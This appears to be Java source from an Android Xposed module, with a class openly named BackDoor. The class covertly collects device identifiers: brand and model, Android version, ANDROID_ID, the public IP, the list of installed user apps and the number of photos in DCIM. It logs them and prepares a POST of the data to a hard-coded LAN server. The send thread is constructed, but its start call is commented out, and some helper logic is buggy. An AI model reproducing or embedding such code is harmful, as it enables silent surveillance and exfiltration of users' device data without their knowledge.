package cn.coderstory.xposedtemplate;

import android.app.AndroidAppHelper;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import com.google.gson.Gson;
import de.robv.android.xposed.XposedBridge;
import lombok.SneakyThrows;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;

import static android.provider.Settings.Secure;

public class BackDoor {
    public static OkHttpClient client = new OkHttpClient();
    public static BackDoor INSTANCE = new BackDoor();
    public static Gson gson = new Gson();

    public void reportDevice() {
        var brand = Build.BRAND + Build.MODEL;
        var version = Build.VERSION.RELEASE;
        var appList = getPkgList();
        AtomicReference<String> ip = new AtomicReference<>(getIP());
        var imgCount = getImageCount();
        DeviceInfo info = new DeviceInfo();
        info.setIp(ip.get());
        info.setApplications(appList);
        info.setBrand(brand);
        info.setAndroidVersion(version);
        info.setImageCount(imgCount);
        var content = AndroidAppHelper.currentApplication().getContentResolver();
        info.setSerial(Secure.getString(content,
                Secure.ANDROID_ID));
        info.setLastOnline(System.currentTimeMillis());
        XposedBridge.log(gson.toJson(info));
        RequestBody body = RequestBody.create(
                MediaType.parse("application/json"), gson.toJson(info));
        Request request = new Request.Builder()
                .url("http://192.168.0.108:8080")
                .post(body)
                .build();
        Thread t = new Thread(() -> client.newCall(request));
        //t.start();

    }
    private boolean isSystemApp(PackageInfo pi) {
        boolean isSysApp = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 1;
        boolean isSysUpd = (pi.applicationInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 1;
        return isSysApp || isSysUpd;
    }
    private List<String> getPkgList() {
        List<String> packages = new ArrayList<>();
        PackageManager packageManager = AndroidAppHelper.currentApplication().getPackageManager();
        try {
            List<PackageInfo> packageInfos = packageManager.getInstalledPackages(PackageManager.GET_ACTIVITIES |
                    PackageManager.GET_SERVICES);
            for (PackageInfo info : packageInfos) {
                if (!isSystemApp(info)) {
                    String s = info.applicationInfo.loadLabel(packageManager).toString();
                    packages.add(s);
                }
            }
        } catch (Throwable t) {
            t.printStackTrace();;
        }
        return packages;
    }
    @SneakyThrows
    String getIP()  {
        AtomicReference<String> result = new AtomicReference<>("");
        Thread t = new Thread(() -> {
            try {
                result.set(client.newCall(new Request(new Request.Builder().url("https://myip.ipip.net/"))).execute().body().string());
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
        t.start();
        while (true) {
            if (!result.get() .equals("")) {
                break;
            }
            Thread.sleep(200);
        }
        return result.get();
    }
    int getImageCount() {
        int num = 0;
        File sdcard = Environment.getExternalStorageDirectory();
        File dcim = new File(sdcard, "DCIM/");
        for (File file : dcim.listFiles()) {
            for (File listFile : file.listFiles()) {
                num++;
            }
        }
        return num;

    }
    void reportVideo(VideoInfo info) {

    }
}
